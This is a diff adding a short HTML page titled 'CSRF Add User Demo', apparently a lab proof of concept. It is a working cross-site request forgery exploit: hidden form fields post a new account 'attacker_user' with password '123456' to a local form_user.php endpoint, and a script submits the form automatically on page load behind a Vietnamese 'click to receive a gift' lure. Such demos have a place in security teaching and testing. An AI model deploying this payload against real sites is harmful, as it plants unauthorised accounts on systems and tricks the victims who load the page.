@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CSRF Add User Demo</h1>
+  <form action="http://localhost:8383/form_user.php" method="POST">
+    <input type="hidden" name="name" value="attacker_user">
+    <input type="hidden" name="fullname" value="attacker_user">
+    <input type="hidden" name="type" value="attacker_user">
+    <input type="hidden" name="password" value="123456">
+    <input type="hidden" name="submit" value="submit">
+    <button type="submit">Click vào đây nhận quà</button>
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
